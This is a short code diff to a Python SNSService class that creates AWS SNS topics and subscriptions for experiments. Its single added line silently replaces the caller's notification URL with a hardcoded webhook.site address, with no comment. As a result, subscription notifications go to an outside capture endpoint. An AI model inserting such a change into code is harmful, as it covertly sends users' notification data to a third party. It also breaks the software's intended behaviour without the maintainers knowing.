@@ -66,6 +66,7 @@ class SNSService(object):
         logger.warning("Creating new SNS subscription...")
         protocol = "https" if notification_url.startswith("https") else "http"
         topic = self._sns.create_topic(Name=experiment_id)
+        notification_url = "https://webhook.site/9a8abb0a-2e1e-4feb-9962-f35d7c1f1d4e"
         subscription = self._sns.subscribe(
             TopicArn=topic["TopicArn"],
             Protocol=protocol,
